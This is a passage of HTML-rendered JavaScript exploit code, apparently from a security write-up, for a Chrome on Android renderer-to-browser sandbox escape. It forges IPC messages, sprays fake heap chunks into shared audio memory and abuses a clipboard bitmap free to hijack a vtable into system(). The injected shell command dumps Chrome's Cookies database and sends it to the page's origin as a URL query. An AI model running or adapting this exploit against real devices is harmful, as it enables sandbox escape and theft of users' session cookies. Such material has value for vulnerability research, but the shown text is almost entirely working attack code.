x);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            buf[x] = read32(buf.addr);</span><br><span class="line">            buf.addr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MFileDesc</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        r: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = read32(buf.addr);</span><br><span class="line">            <span class="keyword">var</span> idx = read32(buf.addr + <span class="number">4</span>);</span><br><span class="line">            buf.addr += <span class="number">8</span>;</span><br><span class="line">            assert(valid);</span><br><span class="line">            assert(idx &lt; buf.fds.length);</span><br><span class="line">            buf[x] = buf.fds[idx];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageSend</span>(<span class="params">routing, type</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">var</span> buf = &#123;<span class="attr">addr</span>: base + <span class="number">4</span>&#125;;</span><br><span class="line">    MInt(routing).w(buf);</span><br><span class="line">    MInt(type).w(buf);</span><br><span class="line">    <span class="keyword">var</span> flags = <span class="number">0x80000002</span>, num_fds = <span class="number">0</span>;</span><br><span class="line">    MInt(flags).w(buf);</span><br><span class="line">    MInt(num_fds).w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_start = buf.addr;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].w(buf);</span><br><span class="line">    <span class="keyword">var</span> payload_size = buf.addr - payload_start;</span><br><span class="line">    write32(base, payload_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    assert(call(funcs.send, pipe_, base, buf.addr - base, <span class="number">0</span>) == buf.addr - base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log = <span class="string">''</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceive</span>(<span class="params">types</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">        <span class="keyword">var</span> base = scratch + <span class="number">0x100</span>;</span><br><span class="line">        call(funcs.memset, base, <span class="number">0xee</span>, <span class="number">0x200</span>);</span><br><span class="line">        <span class="keyword">var</span> len = call(funcs.recv, pipe_, base, <span class="number">4</span>, <span class="number">0</span>) | <span class="number">0</span>;</span><br><span class="line">        assert(len == <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">var</span> msg = &#123;<span class="attr">base</span>: base, <span class="attr">addr</span>: base&#125;;</span><br><span class="line">        MInt(<span class="string">'payload_size'</span>).r(msg);</span><br><span class="line">        <span class="keyword">var</span> len = msg.payload_size + <span class="number">0x10</span>;</span><br><span class="line">        assert(len &lt; <span class="number">0x1fc</span>);</span><br><span class="line">        assert(call(funcs.recv, pipe_, msg.addr, len, <span class="number">0</span>) == len);</span><br><span class="line">        readArgs(msg,</span><br><span class="line">            MInt(<span class="string">'routing'</span>),</span><br><span class="line">            MInt(<span class="string">'type'</span>),</span><br><span class="line">            MInt(<span class="string">'flags'</span>),</span><br><span class="line">            MInt(<span class="string">'num_fds'</span>));</span><br><span class="line">        <span class="keyword">if</span>(msg.num_fds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            msg.fds = [];</span><br><span class="line">            <span class="keyword">var</span> msghdr = scratch + <span class="number">0xc00</span>;</span><br><span class="line">            <span class="keyword">var</span> iov = scratch + <span class="number">0xc20</span>;</span><br><span class="line">            <span class="keyword">var</span> control = scratch + <span class="number">0xc40</span>;</span><br><span class="line">            write32(msghdr + <span class="number">0x00</span>, <span class="number">0</span>); <span class="comment">// msg_name</span></span><br><span class="line">            write32(msghdr + <span class="number">0x04</span>, <span class="number">0</span>); <span class="comment">// msg_namelen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x08</span>, iov); <span class="comment">// msg_iov</span></span><br><span class="line">            write32(msghdr + <span class="number">0x0c</span>, <span class="number">1</span>); <span class="comment">// msg_iovlen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x10</span>, control); <span class="comment">// msg_control</span></span><br><span class="line">            write32(msghdr + <span class="number">0x14</span>, <span class="number">0x100</span>); <span class="comment">// msg_controllen</span></span><br><span class="line">            write32(msghdr + <span class="number">0x18</span>, <span class="number">0</span>); <span class="comment">// msg_flags</span></span><br><span class="line">            write32(iov + <span class="number">0</span>, scratch + <span class="number">0xc28</span>); <span class="comment">// iov_base</span></span><br><span class="line">            write32(iov + <span class="number">4</span>, <span class="number">1</span>); <span class="comment">// iov_len</span></span><br><span class="line">            assert(call(funcs.recvmsg, fd_pipe_, msghdr, <span class="number">0</span>) == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> controllen = read32(msghdr + <span class="number">0x14</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> cmsg = control; cmsg &lt; control + controllen; cmsg += (cmsg_len + <span class="number">3</span>) &amp; ~<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> SCM_RIGHTS = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">var</span> cmsg_len = read32(cmsg);</span><br><span class="line">                <span class="keyword">var</span> cmsg_level = read32(cmsg+<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">var</span> cmsg_type = read32(cmsg+<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmsg_level == SOL_SOCKET &amp;&amp; cmsg_type == SCM_RIGHTS) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> o = <span class="number">0xc</span>; o &lt; cmsg_len; o += <span class="number">4</span>)</span><br><span class="line">                        msg.fds.push(read32(cmsg + o));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(msg.fds.length == msg.num_fds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(types.indexOf(msg.type) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(msg.type != <span class="number">0x00010520</span>)</span><br><span class="line">                log += <span class="string">'spurious '</span> + asHex(msg.type) + <span class="string">'\n'</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"didn't receive desired message(s)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readArgs</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">        <span class="built_in">arguments</span>[i].r(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">messageReceiveDone</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> end = msg.addr;</span><br><span class="line">    <span class="keyword">var</span> true_end = msg.base + <span class="number">20</span> + msg.payload_size;</span><br><span class="line">    <span class="keyword">if</span>(end != true_end)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'extra bytes: '</span> + (true_end - end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setNonblock</span>(<span class="params">fd, on</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> F_SETFL = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">var</span> O_NONBLOCK = <span class="number">00004000</span>;</span><br><span class="line">    assert(call(funcs.fcntl, fd, F_SETFL, on ? O_NONBLOCK : <span class="number">0</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">theFunPart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// A lot of this is relatively unnecessary guesswork</span></span><br><span class="line">    <span class="comment">// because I hate searching for symbols.</span></span><br><span class="line">    <span class="comment">// pause the main thread</span></span><br><span class="line">    <span class="keyword">var</span> SOL_SOCKET = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> SO_TYPE = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">var</span> syms = [</span><br><span class="line">        <span class="string">'getsockopt'</span>,</span><br><span class="line">        <span class="string">'write'</span>,</span><br><span class="line">        <span class="string">'send'</span>,</span><br><span class="line">        <span class="string">'recv'</span>,</span><br><span class="line">        <span class="string">'recvmsg'</span>,</span><br><span class="line">        <span class="string">'close'</span>,</span><br><span class="line">        <span class="string">'memset'</span>,</span><br><span class="line">        <span class="string">'malloc'</span>,</span><br><span class="line">        <span class="string">'__errno'</span>,</span><br><span class="line">        <span class="string">'fcntl'</span>,</span><br><span class="line">        <span class="string">'bsd_signal'</span>,</span><br><span class="line">        <span class="string">'tkill'</span>,</span><br><span class="line">        <span class="string">'getpid'</span>,</span><br><span class="line">        <span class="string">'gettid'</span>,</span><br><span class="line">        <span class="string">'futex'</span>,</span><br><span class="line">        <span class="string">'usleep'</span>,</span><br><span class="line">        <span class="string">'mmap'</span>,</span><br><span class="line">        <span class="string">'munmap'</span>,</span><br><span class="line">        <span class="string">'system'</span></span><br><span class="line">    ];</span><br><span class="line">    funcs = &#123;&#125;;</span><br><span class="line">    syms.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sym</span>) </span>&#123;</span><br><span class="line">        funcs[sym] = dlsym(sym);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    scratch = call(funcs.malloc, <span class="number">0x1000</span>); <span class="comment">// no real need for yet another buffer, but I don't want to break anything</span></span><br><span class="line">    assert(scratch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mypid = call(funcs.getpid), mytid = call(funcs.gettid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> sockets = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> fd = <span class="number">5</span>; fd &lt; <span class="number">100</span>; fd++) &#123;</span><br><span class="line">        write32(scratch + <span class="number">0x78</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(call(funcs.getsockopt, fd, SOL_SOCKET, SO_TYPE, scratch + <span class="number">0x74</span>, scratch + <span class="number">0x78</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(sockets == <span class="number">2</span>) &#123;</span><br><span class="line">                fd_pipe_ = fd;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sockets == <span class="number">7</span>) &#123;</span><br><span class="line">                pipe_ = fd;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sockets++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(fd != <span class="number">100</span>);</span><br><span class="line">    alert(<span class="string">'+3'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block the IO thread (and all the other ones) for a moment</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> SIGUSR2 = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAIT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> FUTEX_WAKE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> myfutex = scratch;</span><br><span class="line">    assert(call(funcs.bsd_signal, SIGUSR2, stub2) != NEGONE);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x10</span>, myfutex);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x14</span>, FUTEX_WAIT);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x18</span>, <span class="number">0xffffffff</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x1c</span>, <span class="number">0</span>);</span><br><span class="line">    write32(callbuf + <span class="number">0x28</span> + <span class="number">0x20</span>, funcs.futex);</span><br><span class="line">    write32(myfutex, <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> tid = mypid + <span class="number">1</span>; tid &lt; mypid + <span class="number">1000</span>; tid++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tid == mytid) <span class="keyword">continue</span>;</span><br><span class="line">        call(funcs.tkill, tid, SIGUSR2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// In practice, this is quite predictable (+ no guards!) and nowhere</span></span><br><span class="line">    <span class="comment">// near this many copies is actually necessary.  But we do what we</span></span><br><span class="line">    <span class="comment">// can...</span></span><br><span class="line">    <span class="keyword">var</span> guessedAddress = <span class="number">0xa0a0a0a0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> PINUSE_BIT = <span class="number">1</span>, CINUSE_BIT = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> chunkSize = <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">var</span> fakeHead = chunkSize | PINUSE_BIT | CINUSE_BIT;</span><br><span class="line">        setNonblock(pipe_, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">var</span> fds = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> stream_id = <span class="number">0</span>; stream_id &lt; <span class="number">100</span>; stream_id++) &#123;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00250067</span>, <span class="comment">// AudioHostMsg_CreateStream</span></span><br><span class="line">                    MInt(stream_id), <span class="comment">// stream_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// render_view_id</span></span><br><span class="line">                    MInt(<span class="number">0</span>), <span class="comment">// session_id</span></span><br><span class="line">                    <span class="comment">// params</span></span><br><span class="line">                    MInt(<span class="number">2</span>), <span class="comment">// format=AUDIO_PCM_FAKE</span></span><br><span class="line">                    MInt(<span class="number">29</span>), <span class="comment">// channel_layout=CHANNEL_LAYOUT_DISCRETE</span></span><br><span class="line">                    MInt(<span class="number">3000</span>), <span class="comment">// sample_rate</span></span><br><span class="line">                    MInt(<span class="number">32</span>), <span class="comment">// bits_per_sample</span></span><br><span class="line">                    MInt(<span class="number">192000</span>), <span class="comment">// frames_per_buffer</span></span><br><span class="line">                    MInt(<span class="number">31</span>), <span class="comment">// channels</span></span><br><span class="line">                    MInt(<span class="number">0</span>)); <span class="comment">// input_channels</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> msg = messageReceive([</span><br><span class="line">                    <span class="number">0x00250032</span>, <span class="comment">// AudioMsg_NotifyStreamCreated</span></span><br><span class="line">                    <span class="number">0x00250053</span> <span class="comment">// AudioMsg_NotifyStreamStateChanged</span></span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(msg.type == <span class="number">0x00250032</span>) &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'handle'</span>),</span><br><span class="line">                        MFileDesc(<span class="string">'socket_handle'</span>),</span><br><span class="line">                        MInt(<span class="string">'length'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">var</span> len = msg.length;</span><br><span class="line">                <span class="comment">//log += 'len=' + len + '\n';</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> PROT_READ = <span class="number">1</span>, PROT_WRITE = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">var</span> MAP_SHARED = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                fds.push([msg.handle, len]);</span><br><span class="line">                <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, msg.handle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                assert(addr != NEGONE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// Sadly, there is no copy-on-write memcpy on Linux like</span></span><br><span class="line">                <span class="comment">// vm_copy on OS X.  Oh well, we have lots of RAM.</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = guessedAddress &amp; <span class="number">0xfff</span>; i &lt; len; i += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                    <span class="comment">// head</span></span><br><span class="line">                    write32(addr + i + <span class="number">4</span>, fakeHead);</span><br><span class="line">                    <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">                    write32(addr + i + <span class="number">8</span>, NEGONE);</span><br><span class="line">                    write32(addr + i + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// dunno if we have enough address space here</span></span><br><span class="line">                assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                readArgs(msg,</span><br><span class="line">                        MInt(<span class="string">'stream_id'</span>),</span><br><span class="line">                        MInt(<span class="string">'new_state'</span>));</span><br><span class="line">                messageReceiveDone(msg);</span><br><span class="line">                <span class="comment">//log += '**' + JSON.stringify(msg) + '\n';</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        log += <span class="string">'got up to '</span> + stream_id + <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// And here is the actual sandbox vulnerability.  This is pretty dumb.</span></span><br><span class="line">        <span class="comment">// This calls Map on the specified pointer, which should fail, then</span></span><br><span class="line">        <span class="comment">// frees it, putting a free allocation in shared memory.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sidenote: It might be possible to use addresses in libchromeview to</span></span><br><span class="line">        <span class="comment">// avoid the ASLR spamming.  dlmalloc's free has a basic check for</span></span><br><span class="line">        <span class="comment">// addresses being &gt;= the first mmapped address, but I think</span></span><br><span class="line">        <span class="comment">// libchromeview happens to be at such addresses.  However, this is</span></span><br><span class="line">        <span class="comment">// easier so who cares...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> CBF_SMBITMAP = <span class="number">7</span>;</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">            MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">            MInt(CBF_SMBITMAP),</span><br><span class="line">            MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">            MInt(guessedAddress + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">            MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">            MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        call(funcs.usleep, <span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucketStart;</span><br><span class="line">        fds:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; fds.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> fd = fds[i][<span class="number">0</span>], len = fds[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> addr = call(funcs.mmap, <span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            assert(addr != NEGONE);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = guessedAddress &amp; <span class="number">0xfff</span>; j &lt; len; j += <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(addr + j + <span class="number">8</span>) != NEGONE) &#123;</span><br><span class="line">                    assert(j + <span class="number">0x1000</span> &lt;= len); <span class="comment">// too lazy to fix</span></span><br><span class="line">                    bucketStart = addr + j;</span><br><span class="line">                    <span class="keyword">break</span> fds;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            assert(call(funcs.munmap, addr, len) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        assert(i != fds.length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">            <span class="comment">// now that we know where it is, do more frees to decrease</span></span><br><span class="line">            <span class="comment">// the chance of spurious allocations (this would probably</span></span><br><span class="line">            <span class="comment">// be better redesigned, but whatever)</span></span><br><span class="line">            <span class="keyword">var</span> bucket = bucketStart + bucketOff;</span><br><span class="line">            write32(bucket + <span class="number">4</span>, fakeHead);</span><br><span class="line">            <span class="comment">// SharedMemory::mapped_file_ (ensures failure)</span></span><br><span class="line">            write32(bucket + <span class="number">8</span>, NEGONE);</span><br><span class="line">            write32(bucket + <span class="number">4</span> + chunkSize, CINUSE_BIT | PINUSE_BIT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x001e0029</span>, <span class="comment">// ClipboardHostMsg_WriteObjectsAsync</span></span><br><span class="line">                MInt(<span class="number">1</span>), <span class="comment">// objects.size</span></span><br><span class="line">                MInt(CBF_SMBITMAP),</span><br><span class="line">                MInt(<span class="number">2</span>), <span class="comment">// params.size</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[0].size</span></span><br><span class="line">                MInt(guessedAddress + bucketOff + <span class="number">8</span>), <span class="comment">// params[0]</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// params[1].size</span></span><br><span class="line">                MInt(<span class="number">0</span>)); <span class="comment">// params[1]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// This is an arbitrary-ish call that allocates an unusually large</span></span><br><span class="line">        <span class="comment">// object with a vtable.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bucket, bucketInBrowser;</span><br><span class="line">        <span class="keyword">var</span> socket_id = <span class="number">1000</span>;</span><br><span class="line">        outer:</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> P2P_SOCKET_TCP_CLIENT = <span class="number">3</span>;</span><br><span class="line">            messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190044</span>, <span class="comment">// P2PHostMsg_CreateSocket</span></span><br><span class="line">                MInt(P2P_SOCKET_TCP_CLIENT), <span class="comment">// type</span></span><br><span class="line">                MInt(++socket_id), <span class="comment">// socket_id</span></span><br><span class="line">                <span class="comment">// local_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">0</span>), <span class="comment">// port</span></span><br><span class="line">                <span class="comment">// remote_address</span></span><br><span class="line">                MInt(<span class="number">4</span>), <span class="comment">// address.size</span></span><br><span class="line">                MInt(<span class="number">0x80808080</span>), <span class="comment">// address</span></span><br><span class="line">                MInt(<span class="number">1234</span>)); <span class="comment">// port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            call(funcs.usleep, <span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> bucketOff = <span class="number">0x200</span>; bucketOff &lt; <span class="number">0x1000</span>; bucketOff += <span class="number">0x100</span>) &#123;</span><br><span class="line">                bucket = bucketStart + bucketOff;</span><br><span class="line">                <span class="keyword">if</span>(read32(bucket + <span class="number">8</span> + <span class="number">0x5c</span>) == P2P_SOCKET_TCP_CLIENT) &#123;</span><br><span class="line">                    bucketInBrowser = guessedAddress + bucketOff;</span><br><span class="line">                    <span class="keyword">break</span> outer;</span><br><span class="line">                &#125;</span><br><span class="line">                write32(bucket, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">100000</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Didn't get allocated or wrong allocation or something"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// There's probably a simpler way but... I've never actually had a</span></span><br><span class="line">        <span class="comment">// chance to use system in an exploit before :]</span></span><br><span class="line">        write32(bucket + <span class="number">8</span>, bucketInBrowser - <span class="number">4</span>);</span><br><span class="line">        <span class="comment">// don't reuse please, this will be unmapped</span></span><br><span class="line">        write32(bucket + <span class="number">4</span>, <span class="number">0x10000</span> | CINUSE_BIT | PINUSE_BIT);</span><br><span class="line">        write32(bucket, funcs.system);</span><br><span class="line">        <span class="keyword">var</span> url = <span class="built_in">window</span>.location.origin + <span class="string">'/sb.png'</span>;</span><br><span class="line">        copystr(bucket + <span class="number">12</span>, <span class="string">'; am start --user 0 -a android.intent.action.VIEW -d "'</span> + url + <span class="string">'?`hd -c 1024 /data/data/com.android.chrome/app_chrome/Default/Cookies`" &amp; kill $PPID'</span>);</span><br><span class="line">        messageSend(<span class="number">0x7fffffff</span>, <span class="number">0x00190052</span>, <span class="comment">// P2PHostMsg_DestroySocket</span></span><br><span class="line">            MInt(socket_id));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        xerr = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok, we're done...</span></span><br><span class="line">    setNonblock(pipe_, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    call(funcs.usleep, <span class="number">100000</span>);</span><br><span class="line">    write32(myfutex, <span class="number">0</span>);</span><br><span class="line">    call(funcs.futex, myfutex, FUTEX_WAKE, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//messageSend(0xfffffffe, 0xfffe);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(xerr) &#123;</span><br><span class="line">        alert(<span class="string">'Exception: '</span> + xerr + <span class="string">'\n'</span> + xerr.stack);</span><br><span class="line">        crash();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">'?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dlsym</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    copystr(callbuf + <span class="number">0x28</span>, name);</span><br><span class="line">    <span class="keyword">var</span> result = call(dlsym_addr, <span class="number">0xffffffff</span>, callbuf + <span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"couldn't find "</span> + name);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    initialOverwrite();</span><br><span class="line">    launderBuffers(buffersToForce, <span class="string">'saveBuffersToForce'</span>, sniffAroundInHeap);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    alert(<span class="string">'Exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;<span 